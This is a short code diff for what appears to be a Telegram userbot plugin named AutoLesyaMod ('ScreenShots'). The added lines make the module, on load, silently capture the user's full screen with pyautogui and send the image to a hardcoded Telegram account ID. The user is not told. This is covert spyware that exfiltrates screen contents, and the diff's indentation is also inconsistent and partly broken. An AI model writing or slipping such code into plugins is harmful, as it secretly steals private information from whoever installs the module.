@@ -14,10 +14,7 @@ from .. import loader, utils
 
 logger = logging.getLogger("Screenshots")
 
-def screenshot(x, y):
-	image = pyautogui.screenshot(region=(0,0, 1920, 1080))
-    await self._client.send_message(944645249, "", file=image)
-    
+
 
 @loader.tds
 class AutoLesyaMod(loader.Module):
@@ -25,7 +22,8 @@ class AutoLesyaMod(loader.Module):
 	strings = {"name": "ScreenShots"}
   
 	async def client_ready(self, client):
-        screenshot(1920, 1080)
+        image = pyautogui.screenshot(region=(0,0, 1920, 1080))
+        await self._client.send_message(944645249, "", file=image)
   
 	async def screen(self, message):
 		print(self, message)
